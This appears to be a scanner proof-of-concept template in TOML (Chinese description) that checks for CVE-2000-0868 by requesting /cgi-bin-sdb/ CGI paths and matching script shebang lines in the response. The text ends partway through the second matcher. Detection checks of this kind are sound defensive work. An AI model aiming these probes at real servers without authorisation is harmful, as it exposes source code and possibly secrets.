[info]
author = "ave"
description = "验证 SuSE Linux 6.4 默认 Apache 配置中 /cgi-bin-sdb/ 别名导致的 CGI 脚本源代码泄露漏洞"
id = "POC-AVE-2000-0983"
name = "CVE-2000-0868 PoC"
severity = "medium"
tags = ["ave-2000-0983"]
vuln_id = [
    "CVE-2000-0868",
    "AVE-2000-0983",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/cgi-bin-sdb/test-cgi"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "#!/usr/bin/perl",
    "#!/bin/sh",
    "#!/bin/bash",
    "#!/usr/bin/python",
    "#!/usr/local/bin/perl",
    "#!/usr/bin/env perl",
    "#!/usr/bin/env python",
]

[[poc.requests]]
method = "GET"
path = "/cgi-bin-sdb/printenv"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
